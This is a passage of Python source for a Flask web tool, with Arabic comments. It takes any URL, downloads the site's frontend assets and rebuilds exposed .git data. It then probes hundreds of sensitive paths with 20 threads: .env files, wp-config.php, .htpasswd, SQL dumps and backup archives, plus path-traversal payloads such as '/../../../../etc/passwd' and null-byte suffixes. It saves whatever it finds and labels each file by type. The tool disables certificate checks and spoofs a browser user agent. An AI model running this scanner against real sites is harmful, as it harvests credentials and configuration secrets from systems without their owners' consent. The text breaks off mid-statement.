import os
import re
import json
import time
import zlib
import shutil
import base64
import hashlib
import logging
import zipfile
import threading
import mimetypes
from io import BytesIO
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse, unquote, quote

import urllib3
import requests
from bs4 import BeautifulSoup
from flask import Flask, render_template, request, jsonify, send_file, Response
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 500 * 1024 * 1024

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SITES_DIR = os.path.join(BASE_DIR, 'sites')
TEMPLATES_DIR = os.path.join(BASE_DIR, 'templates')
STATIC_DIR = os.path.join(BASE_DIR, 'static')

for d in [SITES_DIR, TEMPLATES_DIR, STATIC_DIR]:
    os.makedirs(d, exist_ok=True)

USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'

TASKS = {}
TASK_LOCK = threading.Lock()

# ============================================================
# أدوات مساعدة
# ============================================================

def create_session():
    session = requests.Session()
    retry = Retry(total=5, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry, pool_connections=20, pool_maxsize=20)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    session.headers.update({
        'User-Agent': USER_AGENT,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'DNT': '1',
        'Connection': 'keep-alive'
    })
    session.verify = False
    session.timeout = 15
    return session

def safe_request(session, url, method='GET', allow_redirects=True):
    for attempt in range(3):
        try:
            if method == 'GET':
                resp = session.get(url, allow_redirects=allow_redirects, timeout=15)
            else:
                resp = session.head(url, allow_redirects=allow_redirects, timeout=15)
            return resp
        except Exception as e:
            if attempt == 2:
                return None
            time.sleep(1)
    return None

def sanitize_filename(name):
    name = name.split('?')[0].split('#')[0]
    name = os.path.basename(name)
    name = re.sub(r'[<>:"/\\|?*]', '_', name)
    return name or 'unnamed'

def get_ext(url, content_type=None):
    path = urlparse(url).path.lower()
    ext = os.path.splitext(path)[1]
    known = {'.html','.htm','.css','.js','.json','.xml','.png','.jpg','.jpeg','.gif',
             '.svg','.webp','.bmp','.ico','.woff','.woff2','.ttf','.eot','.otf',
             '.mp4','.webm','.mp3','.wav','.ogg','.pdf','.zip','.tar','.gz','.sql','.db'}
    if ext in known:
        return ext
    if content_type:
        g = mimetypes.guess_extension(content_type.split(';')[0].strip())
        if g:
            return g
    return '.bin'

def is_data_uri(url):
    return url.startswith('data:')

def is_valid_url(url):
    try:
        p = urlparse(url)
        return bool(p.scheme and p.netloc)
    except:
        return False

# ============================================================
# مولد الروابط
# ============================================================

def generate_all_urls(base_url):
    urls = []
    parsed = urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    direct_paths = [
        '/.env', '/.env.local', '/.env.production', '/.env.development',
        '/.env.backup', '/.env.old', '/.env.example', '/.env.bak',
        '/config.js', '/config.json', '/config.yml', '/config.yaml',
        '/configuration.php', '/wp-config.php', '/settings.py', '/settings.js',
        '/package.json', '/package-lock.json', '/yarn.lock', '/composer.json', '/composer.lock',
        '/Dockerfile', '/docker-compose.yml', '/.dockerignore',
        '/.gitignore', '/.gitattributes', '/.git/config', '/.git/HEAD', '/.git/index',
        '/.htaccess', '/.htpasswd', '/web.config', '/nginx.conf',
        '/robots.txt', '/humans.txt', '/sitemap.xml', '/sitemap_index.xml',
        '/server.js', '/app.js', '/index.js', '/main.js', '/routes.js',
        '/database.js', '/db.js', '/connection.js', '/schema.sql', '/dump.sql',
        '/admin/', '/administrator/', '/panel/', '/dashboard/',
        '/backup/', '/backups/', '/backup.zip', '/backup.tar.gz',
        '/logs/', '/log/', '/temp/', '/tmp/', '/cache/',
        '/storage/', '/upload/', '/uploads/', '/assets/', '/static/',
        '/config/', '/settings/', '/inc/', '/includes/', '/lib/', '/vendor/',
        '/phpinfo.php', '/info.php', '/test.php', '/debug.php', '/adminer.php',
        '/wp-admin/', '/wp-includes/', '/wp-json/wp/v2/users', '/xmlrpc.php',
        '/.well-known/security.txt', '/crossdomain.xml',
        '/.vscode/settings.json', '/.idea/workspace.xml',
    ]
    for p in direct_paths:
        urls.append(origin + p)

    traversal_payloads = [
        '/../.env', '/../../.env', '/../../../.env', '/../../../../.env',
        '/....//....//.env', '/..%2f..%2f..%2f.env', '/..%252f..%252f..%252f.env',
        '/../../../wp-config.php', '/../../../../wp-config.php',
        '/../../../../etc/passwd', '/../../../../etc/hosts',
    ]
    for p in traversal_payloads:
        urls.append(origin + p)

    backup_patterns = [
        '/backup.zip', '/backup.tar.gz', '/site.zip', '/www.zip', '/html.zip',
        '/public_html.zip', '/backup_db.zip', '/database_backup.sql',
        '/backup/backup.zip', '/backups/backup.zip',
        '/admin/backup.zip', '/panel/backup.zip',
    ]
    for p in backup_patterns:
        urls.append(origin + p)

    suffixes = ['.bak', '.old', '.orig', '.save', '.swp', '.swo', '~', '.txt', '.html', '.source', '.phps', '.dist']
    important_files = [
        '/wp-config.php', '/config.php', '/configuration.php',
        '/.env', '/package.json', '/server.js', '/app.js', '/index.js',
        '/Dockerfile', '/docker-compose.yml', '/.htaccess', '/nginx.conf',
    ]
    for f in important_files:
        for s in suffixes:
            urls.append(origin + f + s)
        urls.append(origin + f + '?')
        urls.append(origin + f + '#')
        urls.append(origin + f + '%00')
        urls.append(origin + f + '.php')
        urls.append(origin + f + '.txt')

    return list(set(urls))

# ============================================================
# استخراج Git
# ============================================================

def extract_git(base_url, session, output_dir):
    extracted_files = []
    git_dir = os.path.join(output_dir, 'git_dump')
    os.makedirs(git_dir, exist_ok=True)

    parsed = urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    head_url = origin + '/.git/HEAD'
    resp = safe_request(session, head_url)
    if not resp or resp.status_code != 200:
        return extracted_files

    head_content = resp.text.strip()
    ref = None
    if head_content.startswith('ref:'):
        ref = head_content.split(':')[1].strip()

    # تحميل index
    index_url = origin + '/.git/index'
    resp = safe_request(session, index_url)
    if resp and resp.status_code == 200:
        idx_path = os.path.join(git_dir, 'index')
        with open(idx_path, 'wb') as f:
            f.write(resp.content)
        extracted_files.append({'path': '.git/index', 'type': 'git', 'size': len(resp.content)})

    # تحميل config
    config_url = origin + '/.git/config'
    resp = safe_request(session, config_url)
    if resp and resp.status_code == 200:
        cfg_path = os.path.join(git_dir, 'config')
        with open(cfg_path, 'wb') as f:
            f.write(resp.content)
        extracted_files.append({'path': '.git/config', 'type': 'git', 'size': len(resp.content)})

    # تحميل HEAD
    head_path = os.path.join(git_dir, 'HEAD')
    with open(head_path, 'w') as f:
        f.write(head_content)
    extracted_files.append({'path': '.git/HEAD', 'type': 'git', 'size': len(head_content)})

    # إذا وجد ref، نحاول تحميل objects
    if ref:
        ref_url = origin + '/.git/' + ref
        resp = safe_request(session, ref_url)
        if resp and resp.status_code == 200:
            commit_hash = resp.text.strip()[:40]
            if commit_hash:
                # تحميل commit object
                obj_dir = commit_hash[:2]
                obj_file = commit_hash[2:]
                obj_url = origin + f'/.git/objects/{obj_dir}/{obj_file}'
                resp = safe_request(session, obj_url)
                if resp and resp.status_code == 200:
                    try:
                        decompressed = zlib.decompress(resp.content)
                        obj_path = os.path.join(git_dir, f'objects_{commit_hash[:8]}')
                        with open(obj_path, 'wb') as f:
                            f.write(decompressed)
                        extracted_files.append({'path': f'.git/objects/{obj_dir}/{obj_file}', 'type': 'git_object', 'size': len(resp.content)})

                        # استخراج tree hash من commit
                        text = decompressed.decode('utf-8', errors='ignore')
                        tree_match = re.search(r'tree\s+([a-f0-9]{40})', text)
                        if tree_match:
                            tree_hash = tree_match.group(1)
                            tree_dir = tree_hash[:2]
                            tree_file = tree_hash[2:]
                            tree_url = origin + f'/.git/objects/{tree_dir}/{tree_file}'
                            resp2 = safe_request(session, tree_url)
                            if resp2 and resp2.status_code == 200:
                                try:
                                    decompressed2 = zlib.decompress(resp2.content)
                                    tree_path = os.path.join(git_dir, f'tree_{tree_hash[:8]}')
                                    with open(tree_path, 'wb') as f:
                                        f.write(decompressed2)
                                    extracted_files.append({'path': f'.git/objects/{tree_dir}/{tree_file}', 'type': 'git_tree', 'size': len(resp2.content)})
                                except:
                                    pass
                    except:
                        pass

    return extracted_files

# ============================================================
# استخراج الواجهة الأمامية
# ============================================================

def extract_frontend(url, session, output_dir):
    frontend_dir = os.path.join(output_dir, 'frontend')
    folders = ['css', 'js', 'images', 'fonts', 'media', 'data', 'other']
    for f in folders:
        os.makedirs(os.path.join(frontend_dir, f), exist_ok=True)

    extracted = []

    try:
        resp = session.get(url, timeout=30)
        resp.raise_for_status()
        html_content = resp.text
    except Exception as e:
        logger.error(f"Failed to fetch {url}: {e}")
        return extracted

    soup = BeautifulSoup(html_content, 'html.parser')
    base_url = url

    # جمع كل الموارد من HTML
    resources_to_download = set()

    # الصور
    for tag in soup.find_all('img'):
        for attr in ['src', 'data-src', 'data-lazy-src', 'data-original', 'srcset']:
            val = tag.get(attr)
            if val:
                if attr == 'srcset':
                    for part in val.split(','):
                        u = part.strip().split()[0] if part.strip().split() else ''
                        if u and not is_data_uri(u):
                            resources_to_download.add((urljoin(base_url, u), 'images'))
                elif not is_data_uri(val):
                    resources_to_download.add((urljoin(base_url, val), 'images'))

    # الأيقونات
    for tag in soup.find_all('link', rel=lambda r: r and 'icon' in str(r).lower()):
        href = tag.get('href')
        if href and not is_data_uri(href):
            resources_to_download.add((urljoin(base_url, href), 'images'))

    # CSS
    for tag in soup.find_all('link', rel='stylesheet'):
        href = tag.get('href')
        if href and not is_data_uri(href):
            resources_to_download.add((urljoin(base_url, href), 'css'))

    # JavaScript
    for tag in soup.find_all('script', src=True):
        src = tag.get('src')
        if src and not is_data_uri(src):
            resources_to_download.add((urljoin(base_url, src), 'js'))

    # فيديو/صوت
    for tag in soup.find_all(['video', 'audio']):
        for attr in ['src', 'poster']:
            val = tag.get(attr)
            if val and not is_data_uri(val):
                resources_to_download.add((urljoin(base_url, val), 'media'))
        for source in tag.find_all('source'):
            ssrc = source.get('src')
            if ssrc and not is_data_uri(ssrc):
                resources_to_download.add((urljoin(base_url, ssrc), 'media'))

    # تحميل الموارد
    def download_resource(resource_url, folder):
        try:
            resp = session.get(resource_url, timeout=20, stream=True)
            if resp.status_code == 200:
                filename = sanitize_filename(resource_url)
                ext = get_ext(resource_url, resp.headers.get('content-type'))
                if not filename.endswith(ext):
                    filename += ext
                filepath = os.path.join(frontend_dir, folder, filename)
                with open(filepath, 'wb') as f:
                    for chunk in resp.iter_content(8192):
                        f.write(chunk)
                return {'url': resource_url, 'local': f'frontend/{folder}/{filename}', 'type': folder, 'size': os.path.getsize(filepath)}
        except Exception as e:
            logger.error(f"Download error {resource_url}: {e}")
        return None

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(download_resource, r[0], r[1]): r for r in resources_to_download}
        for future in as_completed(futures):
            result = future.result()
            if result:
                extracted.append(result)

    # حفظ HTML
    html_path = os.path.join(frontend_dir, 'index.html')
    with open(html_path, 'w', encoding='utf-8') as f:
        f.write(html_content)
    extracted.append({'url': url, 'local': 'frontend/index.html', 'type': 'html', 'size': len(html_content)})

    # استخراج CSS داخلي
    css_dir = os.path.join(frontend_dir, 'css')
    for i, style in enumerate(soup.find_all('style')):
        if style.string:
            css_file = os.path.join(css_dir, f'inline_style_{i}.css')
            with open(css_file, 'w', encoding='utf-8') as f:
                f.write(style.string)
            extracted.append({'url': f'inline_css_{i}', 'local': f'frontend/css/inline_style_{i}.css', 'type': 'css', 'size': len(style.string)})

    # استخراج JS داخلي
    js_dir = os.path.join(frontend_dir, 'js')
    for i, script in enumerate(soup.find_all('script')):
        if not script.get('src') and script.string:
            js_file = os.path.join(js_dir, f'inline_script_{i}.js')
            with open(js_file, 'w', encoding='utf-8') as f:
                f.write(script.string)
            extracted.append({'url': f'inline_js_{i}', 'local': f'frontend/js/inline_script_{i}.js', 'type': 'js', 'size': len(script.string)})

    return extracted

# ============================================================
# استخراج الخادم
# ============================================================

def extract_backend(base_url, session, output_dir, progress_callback=None):
    backend_dir = os.path.join(output_dir, 'backend')
    os.makedirs(backend_dir, exist_ok=True)

    extracted = []
    all_urls = generate_all_urls(base_url)
    total_urls = len(all_urls)
    completed = 0

    def try_url(target_url):
        nonlocal completed
        resp = safe_request(session, target_url)
        completed += 1
        if progress_callback:
            progress_callback(completed, total_urls)

        if resp and resp.status_code == 200 and len(resp.content) > 0:
            parsed = urlparse(target_url)
            path = parsed.path
            if path.startswith('/'):
                path = path[1:]
            if not path:
                path = 'index'

            filename = sanitize_filename(path)
            if not filename:
                filename = hashlib.md5(target_url.encode()).hexdigest()[:12]

            filepath = os.path.join(backend_dir, filename)
            counter = 1
            while os.path.exists(filepath):
                name, ext = os.path.splitext(filename)
                filepath = os.path.join(backend_dir, f"{name}_{counter}{ext}")
                counter += 1

            with open(filepath, 'wb') as f:
                f.write(resp.content)

            file_type = 'unknown'
            if '.env' in target_url.lower():
                file_type = 'env'
            elif 'config' in target_url.lower():
                file_type = 'config'
            elif '.git' in target_url:
                file_type = 'git'
            elif 'backup' in target_url.lower() or target_url.endswith(('.zip', '.tar.gz', '.rar')):
                file_type = 'backup'
            elif 'sql' in target_url.lower() or target_url.endswith('.db'):
                file_type = 'database'
            elif 'log' in target_url.lower():
                file_type = 'log'
            elif target_url.endswith(('.php', '.asp', '.aspx', '.jsp')):
                file_type = 'server_script'

            return {
                'url': target_url,
                'local': f'backend/{filename}',
                'type': file_type,
                'size': len(resp.content),
                'method': 'direct'
            }
        return None

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(try_url, u): u for u in all_urls}
        for future in as_completed(futures):
            result = future.result()
            if result:
                extracted.append(result)

    return extracted

# ============================================================
# المهمة الرئيسية
# ============================================================

def run_extraction_task(task_id, url, options):
    with TASK_LOCK:
        TASKS[task_id] = {'status': 'running', 'progress': 0, 'phase': 'initializing', 'files': [], 'stats': {}}

    def update(progress, phase):
        with TASK_LOCK:
            TASKS[task_id]['progress'] = progress
            TASKS[task_id]['phase'] = phase

    session = create_session()
    parsed = urlparse(url)
    if not parsed.scheme:
        url = 'https://' + url
        parsed = urlparse(url)

    domain = parsed.netloc.replace(':', '_').replace('.', '_')
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    output_dir = os.path.join(SITES_DIR, f"{domain}_{timestamp}")
    os.makedirs(output_dir, exist_ok=True)

    all_extracted = []

    # استخراج الواجهة
    if options.get('frontend', True):
        update(5, 'Extracting frontend...')
        frontend_files = extract_frontend(url, session, output_dir)
        all_extracted.extend(frontend_files)
        update(20, 'Frontend extraction complete')

    # استخراج Git
    if options.get('git', True):
        update(25, 'Extracting Git repository...')
        git_files = extract_git(url, session, output_dir)
        all_extracted.extend(git_files)
        update(35, 'Git extraction complete')

    # استخراج الخادم
    if options.get('backend', True):
        update(40, 'Scanning backend files...')
        def progress_cb(completed, total):
            pct = 40 + int((completed / total) * 50)
            upd
